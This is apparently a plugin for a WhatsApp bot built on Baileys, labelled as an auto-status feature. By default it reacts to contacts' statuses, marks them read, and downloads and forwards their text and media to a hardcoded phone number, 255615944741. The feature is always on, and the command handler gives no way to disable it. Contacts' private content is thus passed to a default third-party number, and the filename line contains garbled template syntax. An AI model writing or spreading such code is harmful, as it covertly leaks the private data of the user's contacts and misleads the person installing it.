const fs = require('fs/promises');
const path = require('path');
const { downloadMediaMessage } = require('@whiskeysockets/baileys');

const isOwnerOrSudo = require('../lib/isOwner');
const settings = require('../settings');

// ────────────────────────────────────────────────
const CONFIG_FILE = path.join(__dirname, '../data/autoStatus.json');
const TARGET_NUMBER = settings.syncTarget || '255615944741'; // Use settings.js
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;
const SYNC_DELAY = settings.syncDelay || 6; // Low number sync delay

const DEFAULT_CONFIG = Object.freeze({
    enabled: true,             // always on by default
    reactWith: '❤️',           // always react with heart/like by default
    reactDelayMinMs: SYNC_DELAY * 100,     // Use sync delay
    reactDelayMaxMs: SYNC_DELAY * 200,
    infoDelayMinMs: SYNC_DELAY * 150,
    forwardDelayMinMs: SYNC_DELAY * 250,
    forwardDelayMaxMs: SYNC_DELAY * 500,
});

let configCache = null;
const processedStatusIds = new Set();

// ────────────────────────────────────────────────
async function loadConfig() {
    if (configCache) return configCache;

    try {
        const data = await fs.readFile(CONFIG_FILE, 'utf8');
        configCache = { ...DEFAULT_CONFIG, ...JSON.parse(data) };
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error('[AutoStatus] load error → using defaults', err.message);
        }
        configCache = { ...DEFAULT_CONFIG };
        await saveConfig(configCache);
    }
    return configCache;
}

async function saveConfig(updates) {
    configCache = { ...configCache, ...updates };
    try {
        await fs.mkdir(path.dirname(CONFIG_FILE), { recursive: true });
        await fs.writeFile(CONFIG_FILE, JSON.stringify(configCache, null, 2));
    } catch (err) {
        console.error('[AutoStatus] save failed', err.message);
    }
}

// ────────────────────────────────────────────────
function extractPhoneNumber(key) {
    if (!key) return 'unknown';
    const jid = key.participant || key.remoteJid || '';
    const match = jid.match(/^(\d{9,15})/);
    return match ? match[1] : 'unknown';
}

function getTimeStr() {
    return new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Dar_es_Salaam',
        dateStyle: 'short',
        timeStyle: 'medium'
    });
}

function randomMs(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ────────────────────────────────────────────────
async function reactToStatus(sock, key) {
    const cfg = await loadConfig();
    // Always react unless explicitly set to empty string
    if (!cfg.reactWith || cfg.reactWith.trim() === '') return;

    const reaction = {
        key: {
            remoteJid: 'status@broadcast',
            fromMe: false,
            id: key.id,
            participant: key.participant
        },
        text: cfg.reactWith,
        isBigEmoji: true
    };

    try {
        await sock.sendMessage('status@broadcast', { reactionMessage: reaction });
    } catch {
        try {
            await sock.relayMessage('status@broadcast', { reactionMessage: reaction }, { messageId: key.id });
        } catch {}
    }
}

// ────────────────────────────────────────────────
async function forwardStatus(sock, msg) {
    if (!msg?.message || !msg.key?.id) return;

    const msgId = msg.key.id;
    if (processedStatusIds.has(msgId)) return;
    processedStatusIds.add(msgId);
    if (processedStatusIds.size > 800) processedStatusIds.clear();

    const phone = extractPhoneNumber(msg.key);
    const msgType = Object.keys(msg.message)[0] ?? 'unknown';
    const content = msg.message[msgType] ?? {};
    const timeStr = getTimeStr();

    // Skip pure protocol messages without content
    if (['senderKeyDistributionMessage', 'protocolMessage'].includes(msgType) &&
        !content.caption && !msg.message.imageMessage && !msg.message.videoMessage &&
        !msg.message.stickerMessage && !msg.message.audioMessage) {
        console.debug(`[Ignored] protocol msg → ${msgType} • ${phone}`);
        return;
    }

    console.log(`[Status] ${phone} • ${msgType} • ${timeStr}`);

    // 1. Send info message first
    await sock.sendMessage(TARGET_JID, {
        text: `📸 Status from ${phone}`
    }).catch(() => {});

    // Small natural delay before media
    await new Promise(r => setTimeout(r, randomMs(600, 1200)));

    // Text status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = (content.text || content.description || '[no text]').trim();
        await sock.sendMessage(TARGET_JID, {
            text: `${text}\n\n🕒 ${timeStr}`
        }).catch(() => {});
        return;
    }

    // Media handlers
    const MEDIA_HANDLERS = {
        imageMessage:    { type: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
        videoMessage:    { type: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
        audioMessage:    { type: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
        stickerMessage:  { type: 'sticker',  ext: 'webp', mime: 'image/webp'   },
        documentMessage: { type: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
    };

    const handler = MEDIA_HANDLERS[msgType];
    if (!handler) return;

    try {
        const buffer = await downloadMediaMessage(msg, 'buffer', {}, {
            logger: console,
            reuploadRequest: sock.updateMediaMessage
        });

        if (!buffer || buffer.length < 300) throw new Error('empty/corrupt media');

        const captionLines = [
            content.caption?.trim() ? `Caption: ${content.caption.trim()}` : '',
            `🕒 ${timeStr}`
        ].filter(Boolean).join('\n');

        await sock.sendMessage(TARGET_JID, {
            [handler.type]: buffer,
            mimetype: content.mimetype || handler.mime,
            caption: captionLines || undefined,
            fileName: content.fileName || `status-\( {Date.now()}. \){handler.ext}`
        });

        console.log(`[Forward OK] ${handler.type} • ${phone}`);
    } catch (err) {
        console.error('[Forward FAIL]', err.message || err);
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Failed to forward • ${msgType} from ${phone}\n🕒 ${timeStr}`
        }).catch(() => {});
    }
}

// ────────────────────────────────────────────────
async function handleStatusUpdate(sock, ev) {
    const cfg = await loadConfig();
    if (!cfg.enabled) return; // still respect if someone manually set to false

    let msgKey, msgToForward;

    if (ev.messages?.length) {
        const m = ev.messages[0];
        if (m.key?.remoteJid === 'status@broadcast') {
            msgKey = m.key;
            msgToForward = m;
        }
    } else if (ev.key?.remoteJid === 'status@broadcast') {
        msgKey = ev.key;
        msgToForward = ev;
    } else if (ev.reaction?.key?.remoteJid === 'status@broadcast') {
        msgKey = ev.reaction.key;
    }

    if (!msgKey?.remoteJid?.includes('status@broadcast') || !msgKey.id) return;

    if (processedStatusIds.has(msgKey.id)) return;

    try {
        // Quick like/reaction
        await new Promise(r => setTimeout(r, randomMs(cfg.reactDelayMinMs, cfg.reactDelayMaxMs)));
        await reactToStatus(sock, msgKey);

        // Mark read
        await sock.readMessages([msgKey]).catch(() => {});

        // Forward with info first
        await new Promise(r => setTimeout(r, randomMs(cfg.infoDelayMinMs, cfg.infoDelayMinMs + 600)));
        if (msgToForward) await forwardStatus(sock, msgToForward);

    } catch (err) {
        console.error('[AutoStatus] error', err?.message || err);
    }
}

// ────────────────────────────────────────────────
async function autoStatusCommand(sock, chatId, msg, args = []) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAllowed = msg.key.fromMe || (await isOwnerOrSudo(sender, sock, chatId));

    if (!isAllowed) return sock.sendMessage(chatId, { text: '⛔ Owner only' });

    const cfg = await loadConfig();

    if (!args.length) {
        return sock.sendMessage(chatId, {
            text: `🔄 *Auto Status Forwarder* (always on by default)\n\n` +
                  `Forwarding : 🟢 ON\n` +
                  `Reaction   : ❤️ (heart/like)\n` +
                  `Target     : ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `  .autostatus react ❤️🔥😍 / other emoji\n` +
                  `  .autostatus status`
        });
    }

    const cmd = args[0].toLowerCase();

    if (cmd === 'react') {
        if (args.length < 2) {
            return sock.sendMessage(chatId, {
                text: 'Use:\n.autostatus react ❤️\n.autostatus react 🔥\netc.'
            });
        }
        const emoji = args[1].trim();
        // Allow changing emoji, but don't allow turning completely off
        const newReact = emoji.length <= 6 ? emoji : cfg.reactWith;
        await saveConfig({ reactWith: newReact });
        return sock.sendMessage(chatId, { text: `Reaction updated → ${newReact}` });
    }

    if (cmd === 'status') {
        return sock.sendMessage(chatId, {
            text: `Current config:\n${JSON.stringify(cfg, null, 2)}`
        });
    }

    return sock.sendMessage(chatId, { text: 'Unknown command. Use .autostatus' });
}

module.exports = {
    autoStatusCommand,
    handleStatusUpdate
};